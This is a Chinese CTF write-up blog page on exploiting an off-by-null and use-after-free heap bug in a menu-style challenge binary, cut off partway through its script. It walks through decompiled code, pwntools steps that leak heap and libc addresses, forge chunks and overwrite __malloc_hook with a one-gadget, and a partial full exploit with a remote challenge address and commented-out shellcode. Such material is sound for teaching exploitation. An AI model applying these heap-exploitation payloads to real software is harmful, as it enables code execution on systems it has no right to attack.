@@ -1,0 +1,500 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>mmap下的offbynull - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="一、题目：pwn1先checksec下:
+
+保护全开，ida分析一波：
+
+
+12345678910111213141516171819202122232425262728293031void __f,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">mmap下的offbynull</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/mmap%E4%B8%8B%E7%9A%84offbynull/" title="mmap下的offbynull" class="">mmap下的offbynull</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    40k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    36 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/mmap/" rel="tag">mmap</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/offbynull/" rel="tag">offbynull</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h4 id="一、题目：pwn1"><a href="#一、题目：pwn1" class="headerlink" title="一、题目：pwn1"></a>一、题目：pwn1</h4><p>先checksec下:</p>
+<p><img src="/blog_img/1565769137696.png" alt="1565769137696"></p>
+<p>保护全开，ida分析一波：</p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> choice; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      choice = menu();</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( choice == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        free_0();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      malloc_0();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>常规的菜单题，然后分析一波漏洞点:</p>
+<h4 id="1、malloc"><a href="#1、malloc" class="headerlink" title="1、malloc:"></a>1、malloc:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">malloc_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">size_t</span> <span class="built_in">size</span>; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  idx = read_idx();</span><br><span class="line">  <span class="keyword">if</span> ( idx != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"size: "</span>);</span><br><span class="line">    read_size(&amp;<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="built_in">size</span> &amp; <span class="number">0x8000000000000000</span>LL) == <span class="number">0L</span>L &amp;&amp; !chunk_array[idx] )</span><br><span class="line">    &#123;<span class="comment">//size必须为正数</span></span><br><span class="line">      chunk_array[idx] = <span class="built_in">malloc</span>(<span class="built_in">size</span>);<span class="comment">//这里size大小没有检查，所以可以任意</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"info: "</span>);</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, chunk_array[idx], <span class="built_in">size</span>);</span><br><span class="line">      *(<span class="built_in">size</span> - <span class="number">1</span> + chunk_array[idx]) = <span class="number">0</span>;<span class="comment">//这里是漏洞点，offbynull，主要是当第一次malloc(大size)时返回0，申请失败，第二次申请时不会再从main_arena中取，而是从thread_arena中取出来，看源码。。。所以如果size为堆地址，就可以实现任意堆地址写0</span></span><br><span class="line">      size_array[idx] = <span class="built_in">size</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个漏洞点的利用，第一次见，所以比较生疏，后期多多积累，下面继续分析:</p>
+<h4 id="2、show"><a href="#2、show" class="headerlink" title="2、show"></a>2、show</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = read_idx();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = chunk_array[result];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">write</span>(<span class="number">1</span>, chunk_array[v1], size_array[v1]);</span><br><span class="line">      result = <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"\n"</span>, <span class="number">1u</span>LL);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
+
+<p>这个是puts函数打印堆块内容</p>
+<h4 id="3、free"><a href="#3、free" class="headerlink" title="3、free"></a>3、free</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">free_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = read_idx();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( chunk_array[result] )</span><br><span class="line">      <span class="built_in">free</span>(chunk_array[result]);</span><br><span class="line">    result = chunk_array;</span><br><span class="line">    chunk_array[v1] = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>free这里很明显的UAF漏洞，就是指针清空，内存不清空。</p>
+<p>那么结合show函数是可以泄露出libc地址和堆地址的</p>
+<p>最后exit是退出，那么一波操作先得到libc地址和堆地址：</p>
+<h4 id="这里学到一个新姿势，实现unsorted-bin的不合并链接："><a href="#这里学到一个新姿势，实现unsorted-bin的不合并链接：" class="headerlink" title="这里学到一个新姿势，实现unsorted_bin的不合并链接："></a>这里学到一个新姿势，实现unsorted_bin的不合并链接：</h4><h6 id="malloc-0x100-—-gt-malloc-0x20-—-gt-malloc-0x100-—-gt-malloc-0x70-—-gt-top-chunk"><a href="#malloc-0x100-—-gt-malloc-0x20-—-gt-malloc-0x100-—-gt-malloc-0x70-—-gt-top-chunk" class="headerlink" title="malloc(0x100)—&gt;malloc(0x20)—&gt;malloc(0x100)—&gt;malloc(0x70)—&gt;top_chunk"></a>malloc(0x100)—&gt;malloc(0x20)—&gt;malloc(0x100)—&gt;malloc(0x70)—&gt;top_chunk</h6><p>这样chunk1和chunk3之间有个隔开的chunk，就不会合并，chunk4是用来隔开top_chunk的合并。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0</span>,<span class="number">0xf0</span><span class="number">-8</span>,<span class="string">'A'</span>*(<span class="number">0xf0</span><span class="number">-8</span>))</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x10</span><span class="number">-8</span>,<span class="string">'B'</span>*(<span class="number">0x10</span><span class="number">-8</span>))</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x100</span><span class="number">-8</span>,<span class="string">'C'</span>*(<span class="number">0x100</span><span class="number">-8</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x70</span><span class="number">-8</span>,<span class="string">'D'</span>*(<span class="number">0x70</span><span class="number">-8</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x100</span><span class="number">-8</span>,<span class="string">'D'</span>*<span class="number">7</span>)</span><br><span class="line">puts(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">"DDDDDDD"</span>)</span><br><span class="line">heap = u64(rc(<span class="number">7</span>)[<span class="number">1</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_addr--&gt;"</span> + hex(heap)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0xf0</span><span class="number">-8</span>,<span class="string">'A'</span>*<span class="number">7</span>)</span><br><span class="line">puts(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">"AAAAAAA"</span>)</span><br><span class="line">malloc_hook = u64(rc(<span class="number">7</span>)[<span class="number">1</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"malloc_hook--&gt;"</span> + hex(malloc_hook)</span><br><span class="line">onegadget = malloc_hook - libc.symbols[<span class="string">"__malloc_hook"</span>] + <span class="number">0xf1147</span></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="记得当我们需要使用到堆块的presize时，那么size需要为基数，比如0xf8或者0x78这样，而不是0x100或者0x70"><a href="#记得当我们需要使用到堆块的presize时，那么size需要为基数，比如0xf8或者0x78这样，而不是0x100或者0x70" class="headerlink" title="记得当我们需要使用到堆块的presize时，那么size需要为基数，比如0xf8或者0x78这样，而不是0x100或者0x70"></a>记得当我们需要使用到堆块的presize时，那么size需要为基数，比如0xf8或者0x78这样，而不是0x100或者0x70</h4><p>因为只有3次申请的机会，所以要重复利用，3个当4个用，free再malloc~</p>
+<p>这题在heap下很难做，同时漏洞是在size那里，当size为可读可写的地址时，可以写入0，那么想到写到堆块上，vmmap分配内存，那么第一步先使得分配失败，然后跳出main_arena，使用vmmap堆基地址分配内存，就要先得到vmmap堆基地址才行，怎么得到呢？其实vmmap下的攻击手段和heap下是差不多的，工具利用时看内存和arenainfo（命令）来看堆块布局，泄露出vmmap堆基地址的方法和前面差不多，堆块格挡下，然后迁到unsorted_bin中，然后去打印出来，得到地址（vmmap堆的基地址，双链表下的）：举个栗子</p>
+<p>0x00007f7158000078—-&gt;0x00007f71580000b3（top_chunk）</p>
+<p>那么就可以想到其他堆块是链接在0x00007f7158000078上的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0</span>,heap+<span class="number">0x1</span>,<span class="string">'A'</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0xf0</span><span class="number">-8</span>,<span class="string">'A'</span>*(<span class="number">0xf0</span><span class="number">-8</span><span class="number">-1</span>))</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x70</span><span class="number">-8</span>,<span class="string">'B'</span>*(<span class="number">0x70</span><span class="number">-8</span><span class="number">-1</span>))</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x100</span><span class="number">-8</span>,<span class="string">'C'</span>*(<span class="number">0x100</span><span class="number">-8</span><span class="number">-1</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x10</span><span class="number">-8</span>,<span class="string">'B'</span>*<span class="number">7</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x100</span><span class="number">-8</span>,<span class="string">'A'</span>*<span class="number">7</span>)</span><br><span class="line">puts(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">"AAAAAAA"</span>)</span><br><span class="line">thread_arena_heap = u64(rc(<span class="number">7</span>)[<span class="number">1</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"thread_arena_heap---&gt;"</span> + hex(thread_arena_heap)</span><br></pre></td></tr></table></figure>
+
+<p>那么我们得到了vmmap下分配的堆块的基地址，那么在malloc时就可以往任意地址写0</p>
+<p><img src="/blog_img/1565772655586.png" alt="1565772655586"></p>
+<p>这里可以看到，我们通过申请0x70-8大小的堆块，改写0x100那个堆块的pre_size大小为0x160（0xf0+0x70），那我们需要把160旁边的0x101改写为0x100，表示前一个堆块为free状态，才能实现unlink，那么我们通过offbynull，将这个位置写成0:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">1</span>,<span class="number">0x70</span><span class="number">-8</span>,<span class="string">'E'</span>*(<span class="number">0x70</span><span class="number">-8</span><span class="number">-8</span>) + p64(<span class="number">0x160</span>))</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">'F'</span>*<span class="number">7</span>)<span class="comment">#隔开，防止top_chunk合并，保证放到bins中</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,thread_arena_heap+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">1</span>,<span class="string">'B'</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span><span class="number">-8</span>,<span class="string">'G'</span>*(<span class="number">0x100</span><span class="number">-8</span>))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/1565774470304.png" alt="1565774470304"></p>
+<p>这样0x160的free堆块就生成了，那么我们再申请0x100大小堆块再free就可以触发unlink了：</p>
+<p><img src="/blog_img/1565774641439.png" alt="1565774641439"></p>
+<p>成功unlink了，接着就可以通过申请0x160大小堆块去改写0x70堆块的指向为fake_chunk</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'A'</span>*<span class="number">0xe0</span> + p64(<span class="number">0xf0</span>) + p64(<span class="number">0x74</span>) + p64(fake_chunk)</span><br><span class="line">py = py.ljust(<span class="number">0x160</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x160</span>,py)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x70</span><span class="number">-8</span>,<span class="string">'AAAAAAA'</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'A'</span>*<span class="number">0x13</span> + p64(onegadget)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x70</span><span class="number">-8</span>,py)</span><br></pre></td></tr></table></figure>
+
+<p>先写入fake_chunk，然后申请2次得到fake_chunk，改写malloc_hook为onegadget，得到shell~，下面是完整的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn1'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./pwn1'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6</span></span><br><span class="line"><span class="comment"># payload32 = fmtstr_payload(offset ，&#123;xxx_got:system_addr&#125;)</span></span><br><span class="line"><span class="comment"># f = FormatStr(isx64=1)</span></span><br><span class="line"><span class="comment"># f[0x8048260]=0x45372800</span></span><br><span class="line"><span class="comment"># f[0x8048260+4]=0x7f20</span></span><br><span class="line"><span class="comment"># f.payload(7)</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">#shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' </span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'</span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"choice: "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"index: "</span>)</span><br><span 